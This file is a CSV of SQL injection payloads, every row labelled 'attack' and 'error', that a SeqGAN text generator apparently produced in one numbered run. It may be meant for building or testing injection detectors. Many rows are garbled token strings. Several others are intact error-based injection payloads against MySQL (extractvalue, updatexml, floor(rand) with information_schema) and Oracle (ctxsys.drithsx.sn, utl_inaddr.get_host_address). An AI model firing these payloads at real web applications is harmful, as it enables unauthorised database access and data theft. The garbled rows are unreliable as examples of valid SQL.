label,payload,family,payload_type,method,run_id,sample_index
attack,1'||  (  select '9740xh_4386,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,260
attack,-case or or else 4386  )   WHERE 1210  )     )  )     from 5584 FROM when   (  ||=  122  havingx group 0 group 5978 union or WHERE y enda unionconcat    ||  )  ||chr.(  (  (  4232  )  (  )a DINThro  =  (     (  )     and else mn     having group 1Ix..WooI.gygerestt_rdr  (    ||ct  (  0  select and 1  1,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,261
attack,"1""ado.selectad_na",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,262
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ' unionunzaliT  tm   )    (  )   4493  )  )   )   ()       )     (  )      )  e  )   from x whenia * end  ,7469  ||  (  0  ||ch'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'r,x.r  (  4232  >  select fromam benchmark  (  )  ,0x717a767a71  5023  1045  )     --   ),thenor chr  (  ||C  ||  (  =  e ,1  select from 3931   (   )    4232    ,12    4493  ||chr  0  select",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,263
attack,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""q0x717a767a7174690x717a767a71b",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,264
attack,"AND-  select 3785  1 5192 0x7171706a715305     0   WHERE end  )     )   x   3051 1 from   (  select else  ||chrhrhWr  (  ||chr  (  )  ||chrhr  (  113  )  >  extractvalue  =  (      )     x   FROM 0 (  chr  113  *2   )    )     )          )   =  (  )     having when   (  ||cu=t  =  (  (  ,  ,  0  )   orutau9173  )   extractvalue  ,   SELECT else ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,265
attack,"1'||  (  select '.hr""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""w_.  0x7171706a71selectc 1 or by end  ||yl  112  0   3074    SELECT 3051 concat  select D fromhr  (  select :s end  having 6055  ,floor  extractvalue  0   )   then FROMouhavingd.garr.x  ,  6237  ||ctoszuntaleadr.chhr  (  select  from or113 select when   (   (  select concat  )    ,concat  )  ,1   and FROM or FROM  FROM 6055     (  1130x717a767a71,1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,266
attack,"1""   SELECT 0 AYNITINT  grahr  (  (    select information_schemaer   FROM  =  rand,le113  0x7171706a71,,W  0x7171706a71,  ||chr  (  4493  =  ||coun  us.  g L IN.chr  (  (  ||  =  113  >  select   )    ,  )   AND from concat  (  0   SELECT 4493 LS'  =  'tout   hhr  FROM  rand  select  1. ,1 select DITer  _ri   or 8488  R",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,267
attack,"r'a_mFROM   0 from Vor N 1 G  #,floor  113  ac_et  (  then  =  )  )   from end  )  ||chr  (  *   =  )  )  113  ,concat       ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,268
attack,"1""   (    ,  select union""ass whentsut.ss   (  select 0 or 0 1297  ||chr  select   ,  ||chouunadd.show_abbp'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '' like 'erass.cha  (  113   )    extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,269
attack,"-9740'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '`.es.gestt_r.r  ) or 9325  select  , 8488 and 1 #NUSTASNTIhs   x2   )i  )    )   having 'i'  ) or  L     whenxT  *2   (  )    (  )       1045  )    )   )    )    )     ||ISNAUT.U'i'  122  SELECTIT end  )  =  )   (  || whenS   fromunase  113  ,0x717a767a71,0x717a767a71,0x717a767a71n when   SELECTinformation_schemaT  SELECT end,1  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,270
attack,"1%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'a7562_r.(  *   )       =  )     (  SELECT whenr  x  || hhr  (    113  *   )  ,  ),7562  )  (  tr  =  ||csx.   1297  106  ||chr  (  (  0x717a767a71,1   )    )     concat  chr  (  (  i  select from d_r  (  Y      case LC4493T  ||chhoyunuint  ,  ||chr  (  ||  (  (  case 0 hualt_me",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,271
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'hofo'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'w",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,272
attack,-')   1a 1 4493T b 5305 andE   9325  5840  )  )  4386  )   SELECT DIMANCT  (  )  )  0 WHERE 3785 =  ||r  (  )  )  )    )   SELECT 1   n  )  ||athrssSunn*2   )  case mm   (,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,273
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'eeada_uin=_narayualadds.(  113  ||  (  (  select and union  113   m    'i'  3326113  (  ||cr  (  ||counad.erahr  (  0x7171706a71,  ||chr  (  4232  select from t 113  ||cho  (  )  5023  and     (  select from froms.gr.(  (  =  ||chr  =hr.t_ntsroMr.asp a   (  )  )  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,274
attack,"1""hr  =  case =  x  atr.alivgca_rs   (  =  6237  (    )   )   )    )     and x W.chr  rand  112  ||chr  u  113  0 from or #(  ||chr  (  ||chr  (  ||c  =  122  select ,  (  *  ,  rand  )  )   and or when(  4232  having from by x   from :a_art_Wr  (  (  5483  0x7171706a71*   R7469  case p m",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,275
attack,15192x_nt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,276
attack,"r a  113  )    ,,floor  *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,277
attack,"1""_r  teSd_rnayerosuas_nuadft,xsiaytss whena.select dOoNs.r  (  (  ||chr  (  =  select end2   )     )  ,  =  )   )     2 by D FROM end  ||chr  (  113  case",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,278
attack,"1 AND 1 O5483chr.UINCT0x717a767a71.cha  (  ~  *   9173 )   )  )     (  122un  )    )  || end  (  ||chhr  = 3051m)   FROM   then information_schemaT  (  0  having from information_schema hr  (  0  =  select   (0x717a767a71,concat  0   from 1 I dbkhojutlet_reyyery_.hr  (  chr  =  axx.dbyzww_att.a_roysl",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,279
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'ehrtysauaam(  :select concat  )  )     (  113  6825 FROM  select D 1 5305  ,0x5c    = and   113  0    SELECT from   (  a  0T xs mSAm)       from :0(  concat  =  ||chselect from  (  4232  ,0x717a767a71,floor  ||_r  (  *  )  =   or end  )   then bys D     ITo hr  *  SELECT end  )   thenx  (  #2   )     FROM having t  6082  (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,280
attack,1tt_ystzuvkys/rachinformation_schema'  =  'cu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,281
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,282
attack,"1%Q""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  """"  )   thenINCCies union 5483  ,0x717a767a71.,0x78   having R'i'  and  )   or 1 x x  )    AND SELECT 1  )   )    =  =m0 concat  (  SELECT D when 8488 else a from when   (  select Do  )  ||  (  )  ~  4232  --1297whereaj  || AND  )(  6825  )2 1   )and from :r  (  select end  )    ,  (  )  ||chyr  (  )   or Y2017 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,283
attack,"16'  =  'ntunaseer.r  (  ||  =  =  )   )    --itA   FROMn ASunion ROWEIo  case when   (  || then 4493  || else x end  113  )        )    || unionINSUendea end  )   then1 end    (  )||I. RNT  (  =  (  )   ""  )  )   (  from  ||chr  u  ||chr  (  and   AND WHERE group  h 5192 mbelyetunsx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,284
attack,"r.cu  (  --al4232     )na 8488 from  ||c  (  0x7171706a712 when   (  ||r  (  ||chrr  (  0  select whenhrros   or FROM chr  (  (  0  =  )   )  ,floor  || from group  (  case ,  =  ||chrr  ( 1392r  (  (  case 3785 unionIs group by when   (  )   6055l 0 1 1210  )   (  )     (  6055  )     or)  )   )   a D 0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,285
attack,"9891aur  6237= case when   (  (  (  (  || concat  )  chr  (  select concat  (    select  1 WHERE 3785 d information_schema.chr  5023r  (  (  ,  =  )     )  a   (  (  ||cu  chr  (  from  (  )  0   WHERE union 1hr  (  )  ||chr  cr  (  ||,  (  =  ||chr  (  ,  )  113  selectselect 1   ,1  )   )  )  ,0x717a767a71,0x78",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,286
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ''   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wwfj' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,287
attack,1'a end  )     )    (  ||ch x.chr  (  (  ||chr  (  || from  ||c(  0  =  )e  )   )     R 0 1 else union 1S group 1 x         and LSYS DAMINGIECA1   I  select 1 IT  =  )  0   )   and   )    n when     ||  (  =  )   from else Aendj.USRor 1 where then *a from 0 and select by ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,288
attack,"1'   )ua a  information_schemaow IT  5023  )    1210  )   =  ,0x717a767a71,concat  4386  )   then end  =  ,i)   )    )     or 7881 xr  (   concat  (  00x717a767a71v  ,1  =         then 4386  (hr  (  (  (  106  1  =  )n  case and else 7158  )   --  ui(  (  )   x     Rchr  (  ||Uchr  (  9067  ||chr  113  =  =  ,113  ,  #0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,289
attack,"15996xxwel  (  6237b)   5978 ||r  (  (  >  =  )     (  0  )     ,7469  113  )   )    )   and SELECT WHEREE  (  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,290
attack,"1 '||  (  select '   FROM end   SELECT d=  (  4232  casetWdr.s   (  || concat  =  6237,  ||chr  (  (  select else 2131 4607   )     )   E0 6055  ||u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,291
attack,"1  eo9740lowutts   )    --2   )    )    and (  113  0 FROMx DIT end   WHERE 3051 0 1  ||chr  =  #  =  e     tr  SELECT from and h1hr  (  0  ,  ,and concat  ||chr  u  (  )          #  6237,floor  =  t_r  = where select 4386  ,  ,1  )0x717a767a71,1   )    e   d  a information_schema bya  D group 0 end  )    )  4232  )   from ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,292
attack,"r9740e ' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ountetowes  0x7171706a71    then end  ||cu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,293
attack,"-59671\chr' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 't_hr.g  (  as L FROMu  byL else 4607   9627 8488 AND end  rand  case   ,1 3931 concat  =  ,0x78)i     )    8190     (  )  #,  0  rand",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,294
attack,"1v' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'ljwvw;      (  ||hr  (  6055  ||chr  (  ||cst_r.gsxr.(  select dhr  (  =  )   or x 5584 E  )     ),0x717a767a71    )   a LIA.1 group where end   FROM  )   2131 4232  au   =  )    )   xunion ||hr  )  (  =  #,1   x. A from from union else O- select)   x and  || where m when   (  ||chr(  (  0  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,295
attack,"1%floor""  *2,  )   then and s       )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,296
attack,"11""_natualasauncoyerog_zy  eroadettys..r  (  =  ,floorh  rand  113 0,1   ax else  113  )   x by FROM D end  ) 4493)   then by by by 1 ANDAND 1x  x   select concat  (  =  ||chr  (  *)   )   where chr  112  ||chocp.gsxr_amaop  ycconcat  (  (      chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,297
attack,1 etyssgsxet_o,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,298
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'turt_tyxu"" like ""ljm   4493'  =  'chryv.ws a 5584 1 end  )   )    )    )   then D AINCMSTRAS 1 by DT where from 0x5c  =  6055 or by DI.UM  0 SELECT by 1 D else m whenIhr  (  *  ||  113  casec  (  edl.  (  =  =      (  )   then1 1392 s  select by,1 8382  )     )  =  *2   )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,299
attack,"-3775case 7881 ||  (  (   6237  ||chr  (  113  0  randhr  case 1 end  a else from   (  select when where 3074  1297,  (  4232  )  || end  =  ,  )   )     )     concat  select 8488 AA )||chr  (  adt_ar.r  (  )   fromI  )    (  )     SELECT r.chr  (  =  )   or    SELECT or or  end  (  select DASNT IS_r  =  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,300
attack,"1""  )   )  || end   or extractvalue  select I. select 1x  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,301
attack,"-6237c5305xtlinadq    )    x m 0yg AS endn information_schema.v  )  ||,  =  select T7562  *2   )    )     )   )     then # 7881  (  )   )   (  )    )   x x        )    )   x   :from end  ,  ||chr  (  hr  =  =     c me 5584 1 4493  =.achroaer  (  =  6237,1    select DISCn_s 7158  =  4232  )   3785 x",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,302
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '9891(  ,floor  rand  =  case by  ,,7469  ||chr  (  =  case 0 ||  (  case when 4386  case||chr  ||chount_adhhrx.echr  (    or (    s   xfr  _2 AND fromu,concat  )     ),     )  )   )   )   WHERE 1     select end    )   )     )  )   (  (  4510eau'  (  (  (  )   || 5856  ||chr  (  )  6270   or  by",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,303
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'Yn122ax3074",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,304
attack,1jIqf,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,305
attack,"1%""  =  ""l",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,306
attack,"1%concat'||  (  select '.s   )     or RE  ||chr  =  ,  ||(  =  select AND WHERE union dchr  113  113  ,concat  )  *   xxuamn   )    )     9067)  un||ICtr.ger  (  ||chr   concat  6082  (  >  (  0  case when   (  select select   then 1 R 3785 when   x ,concat  6055  113  ||selectnx.chhr  (  4232  0  *2.)  # when   x.(  )  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,307
attack,"1NyuBnatoereras.gdbt_et when  =  select  m   )    ,0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,308
attack,1'  a_)    or 1 E   )    --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,309
attack,"1t%y.113  (  ,concat  SELECT I 1210  =  ,concat  4232  u   ,  ||chThr  (  6237,floor  selectI  =  )   then 3051 1 when   (    )   and   --ruadr.(  ,   (  ||  (  >  select fromhr  (  =  = 6913 RNUkIT end  )   then else select end  ||schr  (hr  (  0  ||  (  ||r  (  (  select or  D union 1   then x DISM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,310
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%a' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'nllnzn   )        4510,  (  )  ||chr  (  ,  =  )    )    *    (  (  ,floor  )   or ,concat  113  *,ix  )     and    FROM union 1 1x 7881 FROM xM u or (  t113  )  )    select  union Du)        )u(  ,  || dr  (  0 fromAND)      xu   x  =  0  a   )    )    )  ||chr  112  )     )   then union ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,311
attack,"1""  =  ""ay",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,312
attack,"1%<' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,313
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""3775xveynaladtyslyzwodu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'' like '"" like ""su",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,314
attack,"1""0x717a767a71neuar",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,315
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'Atxyusww",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,316
attack,"1x' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'f5305' like 'f",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,317
attack,"1% ' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'o'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,318
attack,-5967 1 d  : x   group 3931 end  caseOt_as.Nserasselect   (  Rasss Iwr.Um 1x 1 by select information_schemax. INCkkNAWconcatNThrhrhrhearrr,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,319
attack,"1' 5584 e I else when   where 9173 * || concat  )  select when unionun else chr  (  ||ounuin   or extractvalue    4232  caseANDayxl_t  (  (  0x7171706a71  )  )     )   a 7158  )     or or 4493  #u   =  7469  =  )     )  )     0x717a767a71,1 concat  4232  4232  4232  )   from _ or D end  )     WHERE by 3785 7158  (i,floor  rand  113  chr  (  case   u2   ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,320
attack,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   """"  =  ""       x. 5192 group by end  )   then group 0 concat  (  4232  case 1210  from x end  )   then 1 0 end  ,0x717a767a71,floor    case when   (  (  =  5023  )  ||chr  (   SELECT concat  113  6825   )    )     )     )   SELECT by   )    )   )    6082  ,0x717a767a71,floor  rand  ||chrhr  =u  4232  ,     ,  )  ,1   from 1210  )    (  1045   '+  (  select ' then m)   )     ,6 dr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,321
attack,"' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '  ,  chr  (  =  )   FROM endin*2   )   from select else union or or 6913er  case  (  case R unionE  ||chr  (  =  )          concat  ||chr  (  ,floor  1045  =  0,0x717a767a71,  )     1  ,7562  ,0x717a767a71,floor    ||chr  select union or 1 from )  113     *,0x717a767a71,  select FROM FROM  ama   (  )     E1 anda concat   chG  =  d   a WHERE union union",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,322
attack,1'||  (  select 'q' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'easlau,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,323
